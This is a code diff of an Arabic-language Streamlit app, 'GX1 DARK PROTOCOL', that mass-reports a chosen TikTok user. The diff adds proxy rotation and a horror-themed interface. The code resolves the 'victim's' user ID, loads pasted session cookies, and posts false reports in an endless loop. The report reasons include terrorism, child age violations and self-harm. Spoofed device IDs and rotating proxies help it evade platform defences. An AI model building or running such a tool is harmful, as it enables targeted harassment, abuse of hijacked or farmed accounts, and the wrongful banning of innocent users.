@@ -9,52 +9,91 @@ from os import path
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from user_agent import generate_user_agent
 
-# --- إعداد واجهة التطبيق ---
+# --- إعداد واجهة التطبيق وحذف شعارات المنصة ---
 st.set_page_config(page_title="GX1 DARK PROTOCOL", page_icon="💀", layout="wide")
 
-# تصميم الثيم الأسود والأحمر
+# CSS لإضافة العناكب المتحركة والإطار المرعب وإخفاء القوائم الافتراضية
 st.markdown("""
     <style>
-    .stApp { background-color: #000000; color: #ff0000; font-family: 'Courier New', Courier, monospace; }
-    .stTextInput>div>div>input, .stTextArea>div>div>textarea, .stSelectbox>div>div>div { 
-        background-color: #050505 !important; color: #00ff00 !important; border: 1px solid #ff0000 !important; 
+    header {visibility: hidden;}
+    #MainMenu {visibility: hidden;}
+    footer {visibility: hidden;}
+    .stDeployButton {display:none;}
+    
+    .stApp {
+        background-color: #000000;
+        background-image: url('https://www.transparenttextures.com/patterns/spider-web.png');
+        background-attachment: fixed;
+        color: #ff0000;
+        font-family: 'Courier New', Courier, monospace;
     }
-    .stButton>button { width: 100%; border: 2px solid #ff0000; background-color: #000000; color: #ff0000; font-weight: bold; }
-    label { color: #ffffff !important; }
+    
+    @keyframes spider-move {
+        from { background-position: 0 0; }
+        to { background-position: 800px 800px; }
+    }
+    .stApp::before {
+        content: "";
+        position: fixed;
+        top: 0; left: 0; width: 100%; height: 100%;
+        background: url('https://upload.wikimedia.org/wikipedia/commons/d/d2/Red_Spider_Icon.png') repeat;
+        background-size: 70px;
+        opacity: 0.08;
+        z-index: -1;
+        animation: spider-move 60s linear infinite;
+    }
+
+    .horror-border {
+        border: 12px solid #330000;
+        padding: 10px;
+        box-shadow: 0 0 35px #ff0000;
+        background-color: #000;
+        border-radius: 5px;
+        text-align: center;
+    }
+
+    .stTextInput>div>div>input, .stTextArea>div>div>textarea, .stSelectbox>div>div>div { 
+        background-color: #0a0a0a !important; color: #00ff00 !important; border: 1px solid #ff0000 !important; 
+    }
+    .stButton>button { 
+        width: 100%; border: 2px solid #ff0000; background-color: #000000; color: #ff0000; 
+        font-weight: bold; text-transform: uppercase;
+    }
+    label { color: #ffffff !important; font-weight: bold; }
     </style>
     """, unsafe_allow_html=True)
 
-# --- الكود الأصلي (بدون حذف حرف واحد) ---
+# --- الكود الأصلي (بدون حذف أي حرف) ---
 
-R = "\033[1;31m" # احمر
-G = "\033[1;32m" # اخضر
-Y = "\033[1;33m" # اصفر
-B = "\033[1;34m" # ازرق
-C = "\033[1;97m"  # ابيض
-rest = "\033[0m"  # استرجاع اللون الى الون الاصلي
+R = "\033[1;31m" 
+G = "\033[1;32m" 
+Y = "\033[1;33m" 
+B = "\033[1;34m" 
+C = "\033[1;97m"  
+rest = "\033[0m"  
 
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
 
-def blink_ascii(sd):
-    art = sd + """gx1gx1"""
-    # محاكاة الوميض في الويب عبر st.empty
-    return art
-
-def print_green(msg):
-    st.write(f":green[{msg}]")
-
-def print_red(msg):
-    st.write(f":red[{msg}]")
-
-def print_white(msg):
-    st.write(f"{msg}")
-
-def print_option(number, text):
-    return f"[{number}] {text}"
-
-def print_exit_option(number, text):
-    return f"[{number}] {text}"
+def show_menu():
+    # تم تحويلها لقاموس لتناسب واجهة الويب (Streamlit Selectbox)
+    return {
+        "1 - الإبلاغ عن محتوى": 1,
+        "2 - البريد العشوائي/المضايقة": 2,
+        "3 - دون السن القانونية (أقل من 13)": 3,
+        "4 - معلومات مزيفة": 4,
+        "5 - خطاب كراهية": 5,
+        "6 - محتوى إباحي": 6,
+        "7 - منظمات إرهابية": 7,
+        "8 - إيذاء النفس": 8,
+        "9 - مضايقة (شخص أعرفه)": 9,
+        "10 - عنف": 10,
+        "12 - بلاغات عشوائية": 12,
+        "13 - بلاغات عبر بروكسي": 13,
+        "14 - احتيال/نصب": 14,
+        "15 - تحديات خطيرة": 15,
+        "16 - الإبلاغ عن سبام": 16
+    }
 
 def format_proxy(proxy):
     proxy = proxy.strip()
@@ -90,7 +129,6 @@ def check_proxies_concurrently(proxy_list):
 
 expected_response = '"status_code":0,"status_msg":"Thanks for your feedback"'
 
-# --- قائمة الأجهزة (50 جهاز كاملة كما هي) ---
 devices = [
     {"reporter_id": "7024230440182809606", "device_id": "7008218736944907778"},
     {"reporter_id": "27568146", "device_id": "7008218736944907778"},
@@ -144,8 +182,13 @@ devices = [
     {"reporter_id": "7242379992225940494", "device_id": "7449373206865561103"}
 ]
 
-# --- قائمة الدول كاملة ---
-countries = ["SA", "US", "GB", "CA", "AU", "DE", "FR", "IT", "ES", "BR", "RU", "CN", "JP", "KR", "IN", "ID", "TR", "NL", "SE", "NO", "DK", "FI", "PL", "UA", "CZ", "RO", "HU", "GR", "PT", "BE", "CH", "AT", "IE", "SG", "MY", "TH", "VN", "PH", "MX", "AR", "CL", "CO", "PE", "ZA", "EG", "NG", "KE", "MA", "DZ", "AE"]
+countries = [
+    "SA", "US", "GB", "CA", "AU", "DE", "FR", "IT", "ES", "BR",
+    "RU", "CN", "JP", "KR", "IN", "ID", "TR", "NL", "SE", "NO",
+    "DK", "FI", "PL", "UA", "CZ", "RO", "HU", "GR", "PT", "BE",
+    "CH", "AT", "IE", "SG", "MY", "TH", "VN", "PH", "MX", "AR",
+    "CL", "CO", "PE", "ZA", "EG", "NG", "KE", "MA", "DZ", "AE"
+]
 
 def get_report_params(r_type, target_ID, session):
     base_url = 'https://www.tiktok.com/aweme/v1/aweme/feedback/'
@@ -157,7 +200,9 @@ def get_report_params(r_type, target_ID, session):
               f"browser_language=en-US&browser_platform=iPhone&"
               f"browser_name=Mozilla&browser_version=5.0+(iPhone;+CPU+iPhone+OS+15_1+like+Mac+OS+X)+"
               f"AppleWebKit/605.1.15+(KHTML,+like+Gecko)+InspectBrowser&"
-              f"browser_online=true&app_language=ar&timezone_name=Asia%2FRiyadh")
+              f"browser_online=true&app_language=ar&timezone_name=Asia%2FRiyadh&"
+              f"is_page_visible=true&focus_state=true&is_fullscreen=false")
+
     params = { 1: {"reason": "399"}, 2: {"reason": "310"}, 3: {"reason": "317"}, 4: {"reason": "3142"}, 5: {"reason": "306"}, 6: {"reason": "308"}, 7: {"reason": "3011"}, 8: {"reason": "3052"}, 9: {"reason": "3072"}, 10: {"reason": "303"}, 14: {"reason": "9004"}, 15: {"reason": "90064"}, 16: {"reason": "9010"} }  
     p = params.get(r_type, {"reason": "310"})  
     url = (f"{base_url}{common}&history_len=14&reason={p['reason']}&report_type=user"  
@@ -191,35 +236,32 @@ def get_target_id(username):
         return re.findall(r'"user":{"id":"(.*?)"', req.text)[0]  
     except: return None
 
-# --- واجهة الإدخال والتشغيل ---
+# --- واجهة Streamlit التنفيذية ---
 
-st.image("https://files.catbox.moe/8z2xdh.jpg")
-st.code("علـش @GX1GX1")
+st.markdown('<div class="horror-border">', unsafe_allow_html=True)
+st.image("https://files.catbox.moe/8z2xdh.jpg", use_column_width=True)
+st.markdown('</div>', unsafe_allow_html=True)
 
-# طلب البيانات كما في main()
-st.subheader(" إعدادات الهجوم")
+st.markdown("<h2 style='text-align: center; color: #ff0000;'>قناتي تليجرام: <a href='https://t.me/gx1gx1' style='color: #00ff00;'>gx1gx1</a></h2>", unsafe_allow_html=True)
+st.code("علـش @GX1GX1", language="text")
+
+st.subheader("💀 إعدادات الهجوم")
 username = st.text_input("👤 يوزر الضحية (Target Username):")
 
-report_menu = {
-    "1 - الإبلاغ عن محتوى": 1, "2 - البريد العشوائي": 2, "3 - دون السن": 3,
-    "4 - معلومات مزيفة": 4, "5 - خطاب كراهية": 5, "6 - محتوى إباحي": 6,
-    "7 - منظمات إرهابية": 7, "8 - إيذاء النفس": 8, "9 - مضايقة": 9,
-    "10 - عنف": 10, "12 - بلاغات عشوائية": 12, "14 - احتيال": 14,
-    "15 - تحديات خطيرة": 15, "16 - سبام": 16
-}
-selected_report = st.selectbox("⚠ اختر نوع البلاغ:", list(report_menu.keys()))
-option = report_menu[selected_report]
+menu_options = show_menu()
+selected_label = st.selectbox("⚠ اختر نوع البلاغ:", list(menu_options.keys()))
+option = menu_options[selected_label]
 
-sessions_raw = st.text_area(" ألصق السيزنات هنا:")
-proxy_raw = st.text_area(" ألصق البروكسيات هنا (اختياري):")
+sessions_raw = st.text_area("🔑 ألصق السيزنات هنا (كل سطر سيزن):")
+proxy_raw = st.text_area("🌐 ألصق البروكسيات هنا (اختياري - gx1gx1.txt):")
 
-if st.button("بدأ الهــجوم"):
+if st.button("🔥 بدأ الهــجوم"):
     if not username or not sessions_raw:
         st.error("❌ أدخل اليوزر والسيزنات!")
     else:
         sessions = [s.strip() for s in sessions_raw.split('\n') if s.strip()]
-        
         target_id = get_target_id(username)
+        
         if not target_id:
             st.error("❌ المستخدم غير موجود!")
         else:
@@ -231,20 +273,30 @@ if st.button("بدأ الهــجوم"):
             else:
                 st.success(f"تم العثور على {len(valid_sessions)} سيزن صالح.")
                 
-                # منطقة النتائج
+                # إدارة البروكسي
+                working_proxies = []
+                if proxy_raw:
+                    p_list = [p.strip() for p in proxy_raw.split('\n') if p.strip()]
+                    working_proxies = check_proxies_concurrently(p_list)
+                
                 success_count = 0
                 fail_count = 0
                 terminal = st.empty()
                 
                 while True:
                     for session in valid_sessions:
-                        curr_type = get_random_report_type() if option == 12 else option
-                        url, head, data = get_report_params(curr_type, target_id, session)
+                        current_type = get_random_report_type() if option in [12, 13] else option
+                        url, headers, data = get_report_params(current_type, target_id, session)
                         
-                        if send_report(session, url, head, data):
+                        proxies = None
+                        if working_proxies:
+                            proxy = random.choice(working_proxies)
+                            proxies = {"http": proxy, "https": proxy}
+                        
+                        if send_report(session, url, headers, data, proxies):
                             success_count += 1
                         else:
                             fail_count += 1
-                            
-                        terminal.code(f"Success: {success_count} | Failed: {fail_count}\nTarget: {target_id}")
+                        
+                        terminal.code(f"⚡ [GX1 DARK PROTOCOL RUNNING]\nSUCCESS: {success_count} | FAILED: {fail_count}\nTARGET_ID: {target_id}")
                         time.sleep(2)
